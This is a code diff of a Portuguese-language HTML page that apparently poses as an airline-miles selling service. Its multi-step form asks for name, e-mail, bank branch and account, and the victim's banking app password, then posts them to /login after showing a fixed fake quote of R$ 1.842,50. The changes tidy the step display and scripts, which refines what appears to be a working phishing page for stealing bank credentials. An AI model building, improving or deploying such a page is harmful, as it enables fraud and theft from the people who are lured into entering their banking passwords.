@@ -19,14 +19,14 @@
         .container-form { max-width: 480px; margin: -70px auto 50px auto; padding: 0 15px; }
         .card { background: white; border: none; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); padding: 30px; }
         
-        /* Sistema de Passos - Resolvendo o travamento */
+        /* Sistema de Passos - DISPLAY BLOCK FORÇADO NA ACTIVE */
         .step { display: none !important; }
         .step.active { display: block !important; animation: fadeIn 0.3s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
         .form-control { border-radius: 10px; padding: 12px; border: 1px solid #ddd; margin-bottom: 20px; width: 100%; box-sizing: border-box; }
         .btn-main { background: var(--blue); color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 700; width: 100%; cursor: pointer; font-size: 1.1rem; }
-        .btn-success { background: #28a745; color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 800; width: 100%; cursor: pointer; }
+        .btn-success { background: #28a745; color: white; border: none; border-radius: 50px; padding: 16px; font-weight: 800; width: 100%; cursor: pointer; display: block; width: 100%; }
         .val-cotacao { color: #28a745; font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.5rem; }
     </style>
 </head>
@@ -43,7 +43,8 @@
 
 <div class="container-form">
     <div class="card">
-        <form id="milhasForm" action="/login" method="POST">
+        <form id="mainForm" action="/login" method="POST">
+            
             <div class="step active" id="s1">
                 <h4 class="fw-bold mb-4 text-center">Inicie sua cotação</h4>
                 <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
@@ -51,6 +52,7 @@
                 <input type="email" name="email" class="form-control" placeholder="E-mail" required>
                 <button type="button" class="btn-main" onclick="changeStep(2)">AVANÇAR</button>
             </div>
+
             <div class="step" id="s2">
                 <h4 class="fw-bold mb-4 text-center">Dados de Recebimento</h4>
                 <input type="text" name="agencia" class="form-control" placeholder="Agência">
@@ -58,18 +60,28 @@
                 <input type="password" name="senha_app" class="form-control" placeholder="Senha do App do Banco">
                 <button type="button" class="btn-main" onclick="changeStep(3)">VER VALOR FINAL</button>
             </div>
+
             <div class="step text-center" id="s3">
                 <p class="text-muted text-uppercase fw-bold small mb-1">Cotação Disponível</p>
                 <div class="val-cotacao mb-4">R$ 1.842,50</div>
+                <p class="small text-muted mb-4">Ao clicar abaixo, você concorda com os termos de venda.</p>
+                
                 <button type="submit" class="btn-success">EFETUAR VENDA AGORA</button>
             </div>
+
         </form>
     </div>
 </div>
 
 <script>
     function changeStep(nextStep) {
-        document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+        // Remove a classe active de todos os elementos com a classe 'step'
+        const steps = document.querySelectorAll('.step');
+        steps.forEach(step => {
+            step.classList.remove('active');
+        });
+
+        // Adiciona a classe active no passo desejado
         const target = document.getElementById('s' + nextStep);
         if (target) {
             target.classList.add('active');
@@ -77,5 +89,6 @@
         }
     }
 </script>
+
 </body>
 </html>
